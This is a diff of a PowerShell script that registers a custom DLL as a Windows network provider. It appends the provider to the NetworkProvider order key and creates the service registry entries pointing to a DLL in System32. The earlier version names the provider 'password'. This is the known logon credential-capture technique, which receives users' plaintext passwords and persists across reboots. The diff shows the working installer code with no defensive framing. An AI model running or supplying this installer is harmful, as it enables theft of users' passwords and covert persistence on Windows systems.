@@ -1,9 +1,21 @@
-$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
-$UpdatedValue = $Path.PROVIDERORDER + ",password"
-Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+$dllname = "dllname" # no .dll extension
 
-New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\password
-New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\password\NetworkProvider
-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\password\NetworkProvider -Name "Class" -Value 2
-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\password\NetworkProvider -Name "Name" -Value password
-New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\password\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\password.dll"
+$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+
+if (!$path.ProviderOrder.Contains($dllname)) # check if script has already been run
+{
+    $UpdatedValue = $Path.PROVIDERORDER + "," + $dllname
+    Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+
+    $servicepath1 = "HKLM:\SYSTEM\CurrentControlSet\Services\"+$dllname
+    $servicepath2 = "HKLM:\SYSTEM\CurrentControlSet\Services\"+$dllname+"\NetworkProvider"
+    $dllpath = "%SystemRoot%\System32\"+$dllname+".dll"
+
+    New-Item -Path $servicepath1
+    New-Item -Path $servicepath2
+    New-ItemProperty -Path $servicepath2 -Name "Class" -Value 2
+    New-ItemProperty -Path $servicepath2 -Name "Name" -Value $dllname
+    New-ItemProperty -Path $servicepath2 -Name "ProviderPath" -PropertyType ExpandString -Value $dllpath
+} 
+
+
